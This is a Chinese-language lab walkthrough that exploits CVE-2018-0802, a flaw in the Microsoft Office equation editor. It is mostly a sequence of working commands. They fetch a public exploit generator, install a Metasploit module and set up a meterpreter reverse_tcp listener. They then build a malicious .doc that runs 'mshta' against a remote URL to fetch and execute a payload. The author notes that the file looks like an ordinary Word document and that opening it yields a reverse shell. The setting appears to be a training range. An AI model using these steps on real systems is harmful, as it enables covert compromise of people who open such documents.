---
description: CVE-2018-0802
---

# Microsoft Office命令执行漏洞

## 【原理】

该漏洞由于office公式编辑器组件EQNEDT32.EXE，对字体名的长度没有进行长度检验，导致攻击者可以通过构造恶意的字体名，执行任意代码。

## 【工具】

* Office
* Python
* kali

## 【步骤】

```text
win7 ip ：172.28.168.194

kali ip： 172.28.168.195
```

1.点击启动场景按钮，等待场景启动完成后，通过靶标接入协议进入漏洞标靶

2.检查是否存在漏洞

下载脚本：[https://gitee.com/Harveysn0w/cve-2018-0802](https://gitee.com/Harveysn0w/cve-2018-0802)

输入下面的命令：

```text
cd Documents/RTF_11882_0802 //进入exp文件夹
python RTF_11882_0802.py -c "cmd.exe /c calc.exe" -o calc.doc //生成测试文件
```

![image-20210222215554527](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210222215554527.png)

双击打开calc.doc，如果弹出计算器说明存在漏洞：

![image-20210222214857215](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210222214857215.png)

3.漏洞利用

首先需要下载[PS\_shell.rb](https://myzxcg.com/file/PS_shell.rb)，将它放到msf路径下

```text
mv PS_shell.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/
```

![image-20210222222217351](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210222222217351.png)

![image-20210222222244032](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210222222244032.png)

当然如果你的路径和我不一样，可以用locate自己找一下

接着就是启动msf。

![image-20210222222354206](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210222222354206.png)

利用msf生成的脚本

```text
use exploits/windows/smb/PS_shell
set payload windows/meterpreter/reverse_tcp
show options
set lhost 172.28.168.195     //kali的ip
set LPORT 4444
set uripath 123
exploit
```

![image-20210222222926675](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210222222926675.png)

![image-20210225194041629](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210225194041629.png)

生成病毒文件：

```text
python RTF_11882_0802.py -c "mshta http://192.168.119.129:8080/235" -o new.doc
```

![image-20210222223109836](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210222223109836.png)

在靶机上打开new.doc，打开之后就是普通word文档的样子，看不出什么异常：

![image-20210222223230663](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210222223230663.png)

打开之后，kali成功收到反弹shell。

![image-20210222223831270](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210222223831270.png)

